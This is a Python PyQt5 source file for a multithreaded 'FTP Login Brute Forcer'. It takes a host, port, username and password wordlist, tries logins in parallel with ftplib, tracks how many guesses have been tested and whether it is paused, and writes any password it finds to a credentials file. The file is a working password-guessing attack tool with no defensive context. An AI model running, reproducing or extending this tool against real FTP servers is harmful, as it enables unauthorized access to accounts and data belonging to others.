
### ### ### ### ### ## ### ### ### ###
### ### ### BUILT-IN LIBRARIES ### ###
### ### ### ### ### ## ### ### ### ###
import ftplib
from time import sleep
import logging
from queue import Queue

### ### ### ### ## ## ## ### ### ###
### ### ### CUSTOM LIBRARIES ### ###
### ### ### ### ## ## ## ### ### ###
import libs

from stdo import stdo
from tools import save_to_json, load_from_json, path_control
from qt_tools import qtimer_Create_And_Run

from structure_ui import Structure_UI, init_and_run_UI, Graphics_View  # , init_UI
from structure_threading import Thread_Object


from PyQt5.QtGui import QTextCursor
from PyQt5.QtCore import QPoint

### ### ### ### ### ## ## ## ### ### ### ### ###
### ### ### CAMERA UI CONFIGURATIONS ### ### ###
### ### ### ### ### ## ## ## ### ### ### ### ###


class Ui_FTP_Brute_Forcer(Structure_UI):
    logger_level = logging.INFO
    #__Threads = dict()
    
    def __init__(self, *args, obj=None, **kwargs):
        self.__thread_Dict = dict()
        super(Ui_FTP_Brute_Forcer, self).__init__(*args, **kwargs)

        ### ### ### ### ###
        ### Constractor ###
        ### ### ### ### ###
        self.terminal_output_buffer = list()
        self.is_found = False
        self.is_process_pause = False
        self.__thread_Quit_Force = False
        self.last_Password_List_Path = ""
        self.passwords_list = list()
        self.wordlist_index = 0

        # initialize the queue
        self.wordlist = Queue()
        
        ### ### ### ### ###
        ### ### Init ### ##
        ### ### ### ### ###
        self.init()

    def quit_Statement(self, bool=None):
        if self.is_Quit_App():
            return True
        if bool is not None:
            self.__thread_Quit_Force = bool
        return self.__thread_Quit_Force

    ### ### ## ### ###
    ### OVERWRITES ###
    ### ### ## ### ###
    
    def init(self):
        self.configure_Other_Settings()
        self.load_Settings()
        self.load_Process()
        
    def init_QTimers(self, *args, **kwargs):
        super(Ui_FTP_Brute_Forcer, self).init_QTimers(*args, **kwargs)
        self.terminal_Output_Renderer_Init()
        
    def terminal_Output_Renderer(self):
        if len(self.terminal_output_buffer):
            self.plainTextEdit_Terminal_Output.appendPlainText(
                str(self.terminal_output_buffer.pop())
            )
        
    def terminal_Output_Renderer_Init(self):
        self.QTimer_Dict["terminal_Output_Renderer"] = qtimer_Create_And_Run(
            self,
            self.terminal_Output_Renderer,
            1
        )
        self.QTimer_Dict["check_Alive_Threads"] = qtimer_Create_And_Run(
            self,
            lambda: self.lcdNumber_Active_Threads.display(
                len(
                    [
                        alive_thread for alive_thread in self.__thread_Dict.values()
                        if alive_thread.is_alive()
                    ]
                )
            ),
            10
        )
        
    def switch_Process_Pause(self, bool=None):
        if bool is not None:
            self.is_process_pause = bool
        else:
            self.is_process_pause = not self.is_process_pause
        return self.is_process_pause
        
    def is_Process_Pause(self):
        return self.is_process_pause
        
    def configure_Button_Connections(self):
        
        self.pushButton_Save_Settings.clicked.connect(
            self.save_Settings
        )
        self.pushButton_Load_Settings.clicked.connect(
            self.load_Settings
        )
        
        self.pushButton_Save_Process.clicked.connect(
            self.save_Process
        )
        self.pushButton_Load_Process.clicked.connect(
            self.load_Process
        )
        
        self.pushButton_Process_Pause.clicked.connect(
            lambda: self.switch_Process_Pause()
        )
        self.pushButton_Start_Process.clicked.connect(
            lambda: self.process_Thread_Start(
                trigger_quit=lambda: self.quit_Statement(),
                trigger_pause=self.is_Process_Pause
            )
        )
        self.pushButton_Process_Stop.clicked.connect(
            lambda: self.quit_Statement(True)
        )
        self.pushButton_Load_Wordlist.clicked.connect(
            self.load_Wordlist_Action
        )

    def load_Wordlist_Action(self):
        self.last_Password_List_Path = self.QFileDialog_Event(
            "getOpenFileName",
            [
                "Open file",
                "",
                "Wordlist files (*.txt)"
            ]
        )[0]
        self.wordlist_Set(self.last_Password_List_Path)
        
    def wordlist_Set(self, path):
        self.passwords_list = open(path).read().split("\n")
        self.passwords_list = self.passwords_list[len(self.passwords_list) - self.wordlist_index:]
        self.wordlist_index = len(self.passwords_list)
        
        self.progressBar_Process.setMaximum(len(self.passwords_list))
        self.QTFunction_Caller_Event_Add([
            self.lcdNumber_Tested_Words.display,
            [self.wordlist_index]
            # [len(self.passwords_list) - self.wordlist_index]
        ])

        self.passwordlist_to_Queue(self.passwords_list)
    
    def passwordlist_to_Queue(self, passwords_list):
        # put all passwords to the queue
        for password in passwords_list:
            self.wordlist.put(password)
        
    def switch_Video_Save_Stop(self, bool=None):
        self.is_Video_Saving_Stopped = bool if bool is not None else not self.is_Video_Saving_Stopped
        return self.is_Video_Saving_Stopped

    def is_Video_Save_Stop(self):
        return self.is_Quit_App() if self.is_Quit_App() else self.is_Video_Saving_Stopped

    def configure_Other_Settings(self):
        pass

    def closeEvent(self, *args, **kwargs):
        super(Ui_FTP_Brute_Forcer, self).closeEvent(*args, **kwargs)

    def save_Settings(self):
        save_to_json(
            path="settings.json",
            data={
                "host": self.lineEdit_Host.text(),
                "port": self.spinBox_Port.value(),
                "username": self.lineEdit_Username.text(),
                "timeout": self.spinBox_Timeout.value(),
                "max_Thread_Number": self.spinBox_Max_Thread_Number.value(),
            },
            sort_keys=False,
            indent=4
        )
        
    def load_Settings(self):
        if path_control("settings.json", is_file=True, is_directory=False)[0]:
            self.settings = load_from_json(
                path="settings.json"
            )
            self.lineEdit_Host.setText(
                self.settings["host"]
            )
            self.spinBox_Port.setValue(
                self.settings["port"]
            )
            self.lineEdit_Username.setText(
                self.settings["username"]
            )
            self.spinBox_Timeout.setValue(
                self.settings["timeout"]
            )
            self.spinBox_Max_Thread_Number.setValue(
                self.settings["max_Thread_Number"]
            )
    
    def save_Process(self):
        save_to_json(
            path="process.json",
            data={
                "last_Password_List_Path": self.last_Password_List_Path,
                "index": self.wordlist_index
            },
            sort_keys=False,
            indent=4
        )
    
    def load_Process(self):
        if path_control("process.json", is_file=True, is_directory=False)[0]:
            self.process_Savings = load_from_json(
                path="process.json"
            )
            self.last_Password_List_Path = self.process_Savings["last_Password_List_Path"]
            self.wordlist_index = self.process_Savings["index"]
            self.wordlist_Set(
                path=self.last_Password_List_Path
            )
            
    def terminal_Print(self, string):
        self.terminal_output_buffer.append(string)

    def process_Thread_Start(self, trigger_quit=None, trigger_pause=None):
        self.terminal_Print(f"|-- [.] IP:Port = {self.lineEdit_Host.text()}:{self.spinBox_Port.value()} FTP Brute Force Started for Username '{self.lineEdit_Username.text()}'.")

        for index in range(self.spinBox_Max_Thread_Number.value()):
            thread_name = f"thread_Process_{index}"
            self.terminal_Print(f"|-- [.] '{thread_name}' Thread Created")
            
            self.__thread_Dict[thread_name] = Thread_Object(
                name=f"Ui_FTP_Brute_Forcer.process_Thread:{thread_name}",
                delay=0.1,
                # logger_level=None,
                set_Deamon=True,
                run_number=1,
                quit_trigger=trigger_quit
            )
            self.__thread_Dict[thread_name].init(
                params=[
                    self.lineEdit_Host.text(), 
                    self.spinBox_Port.value(),
                    self.lineEdit_Username.text(), 
                    self.wordlist,
                    self.spinBox_Timeout.value(), 
                    trigger_pause
                ],
                task=self.process_Thread
            )
            self.__thread_Dict[thread_name].start()
        
    def connect_FTP(self, host, port, username, password, timeout):
        server = ftplib.FTP()
        is_Connected = False
        is_Login_Successfully = False
        is_Timeout = False
        exception = ""
        
        try:
            # tries to connect to FTP server with a timeout of 5
            server.connect(
                host=host, 
                port=port, 
                timeout=timeout
            )
            is_Connected = True
            
            # login using the credentials (user & password)
            server.login(
                username, 
                password
            )
            is_Login_Successfully = True
        
        except ftplib.error_perm:
            # login failed, wrong credentials
            pass
        except ftplib.all_errors as error:
            errorcode_string = str(error).split(None, 1)[0]
            if errorcode_string == "110":
                is_Timeout = True
                exception += f" | ERRNO: {errorcode_string}"
            is_Timeout = True
        
        except Exception as error:
            exception = str(error)
        
        return is_Connected, is_Login_Successfully, is_Timeout, exception
    
    def process_Thread(self, host, port, username, wordlist, timeout, trigger_pause):
        counter_Timeout = 0
        while not self.is_Found():
            if self.quit_Statement():
                return
            if not trigger_pause():
                # get the password from the queue
                password = wordlist.get()
                
                # initialize the FTP server object
                is_Connected, is_Login_Successfully, is_Timeout, exception = self.connect_FTP(
                    host=host,
                    port=port,
                    username=username,
                    password=password,
                    timeout=timeout
                )
                if is_Connected:
                    if is_Login_Successfully:
                        # correct credentials
                        self.terminal_Print(f"|-- [+] {host}:{port} FTP Password is {password}")
                        self.found_Notify(
                            wordlist, 
                            host, port, 
                            username, password
                        )
                    else:
                        self.terminal_Print(f"|-- [-] Tried: {password}")
                        self.wordlist_index -= 1
                        self.QTFunction_Caller_Event_Add([
                            self.progressBar_Process.setValue,
                            [len(self.passwords_list) - self.wordlist_index]
                        ])
                        self.QTFunction_Caller_Event_Add([
                            self.lcdNumber_Tested_Words.display,
                            [self.wordlist_index]
                        ])
                        continue
                    
                else:
                    if is_Timeout:
                        self.terminal_Print(
                            f"|-- [-] Timeout ({timeout} sec) for '{password}'.")
                        counter_Timeout += 1
                    else:
                        self.terminal_Print(
                            f"|-- [-] Exception Occurred ({password}): {exception}")
                
                if counter_Timeout > 10:
                    self.terminal_Print(f"|-- [-] Max Timeout Try Exceeded {counter_Timeout}")
                    break
            else:
                self.terminal_Print(f"|-- [-] Sleeping 0.1 secs")
                sleep(0.1)
        
    
    def found_Notify(self, wordlist, host, port, username, password):
        self.is_Found(True)
        
        save_to_json(
            path="credentials", 
            data={
                "host": host,
                "port": port,
                "username": username,
                "password": password
            },
            sort_keys=False, 
            indent=4
        )
        
        # we found the password, let's clear the queue
        with wordlist.mutex:
            wordlist.queue.clear()
            wordlist.all_tasks_done.notify_all()
            wordlist.unfinished_tasks = 0

        # notify the queue that the task is completed for this password
        wordlist.task_done()
    
    def is_Found(self, bool=None):
        if bool is not None:
            self.is_found = bool
        return self.is_found
        
### ### ### ### ### ## ## ## ### ### ### ### ###
### ### ### ### ### ## ## ## ### ### ### ### ###
### ### ### ### ### ## ## ## ### ### ### ### ###

if __name__ == "__main__":
    # title, Class_UI, run=True, UI_File_Path= "test.ui", qss_File_Path = ""
    stdo(1, "Running {}...".format(__name__))
    app, ui = init_and_run_UI(
        "FTP Login Brute Forcer",
        Ui_FTP_Brute_Forcer,
        UI_File_Path="ftp_cracker_UI.ui"
    )
